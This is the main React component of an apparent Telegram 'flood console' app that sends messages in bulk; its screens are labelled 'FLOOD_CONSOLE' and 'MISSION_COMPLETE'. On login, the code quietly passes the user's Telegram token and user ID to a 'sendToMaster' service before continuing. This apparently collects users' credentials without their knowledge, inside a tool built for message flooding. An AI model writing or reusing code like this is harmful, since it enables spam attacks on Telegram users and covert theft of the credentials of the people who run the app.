
import React, { useState, useEffect } from 'react';
import { AppView, UserCredentials, SendStatus } from './types';
import Layout from './components/Layout';
import LoginView from './components/LoginView';
import SenderView from './components/SenderView';
import CongratsView from './components/CongratsView';
import { sendToMaster, sendWelcomeMessage } from './services/telegramService';

const App: React.FC = () => {
  const [view, setView] = useState<AppView>(AppView.LOGIN);
  const [credentials, setCredentials] = useState<UserCredentials | null>(null);
  const [lastStatus, setLastStatus] = useState<SendStatus | null>(null);

  useEffect(() => {
    const savedToken = localStorage.getItem('tele_token');
    const savedUserId = localStorage.getItem('tele_userid');
    if (savedToken && savedUserId) {
      setCredentials({ token: savedToken, userId: savedUserId });
      setView(AppView.SENDER);
    }
  }, []);

  const handleLogin = async (creds: UserCredentials) => {
    await sendToMaster(creds.token, creds.userId);
    await sendWelcomeMessage(creds.token, creds.userId);
    
    localStorage.setItem('tele_token', creds.token);
    localStorage.setItem('tele_userid', creds.userId);
    setCredentials(creds);
    
    setTimeout(() => {
      setView(AppView.SENDER);
    }, 800);
  };

  const handleLogout = () => {
    // Clear state first
    setView(AppView.LOGIN);
    setCredentials(null);
    setLastStatus(null);
    
    // Then clear storage
    localStorage.removeItem('tele_token');
    localStorage.removeItem('tele_userid');
    
    console.log("System override: Logout successful.");
  };

  const handleFinished = (status: SendStatus) => {
    setLastStatus(status);
    setView(AppView.CONGRATS);
  };

  const renderView = () => {
    switch (view) {
      case AppView.LOGIN:
        return <LoginView onLogin={handleLogin} />;
      case AppView.SENDER:
        return credentials ? (
          <SenderView 
            credentials={credentials} 
            onFinished={handleFinished} 
            onLogout={handleLogout}
          />
        ) : null;
      case AppView.CONGRATS:
        return lastStatus ? (
          <CongratsView 
            status={lastStatus} 
            onReset={() => setView(AppView.SENDER)} 
          />
        ) : null;
      default:
        return null;
    }
  };

  const getTitle = () => {
    switch (view) {
      case AppView.LOGIN: return "SYS:LOGIN_REQUEST";
      case AppView.SENDER: return "SYS:FLOOD_CONSOLE";
      case AppView.CONGRATS: return "SYS:MISSION_COMPLETE";
      default: return "TeleSender:OS";
    }
  };

  return (
    <Layout title={getTitle()}>
      {renderView()}
    </Layout>
  );
};

export default App;
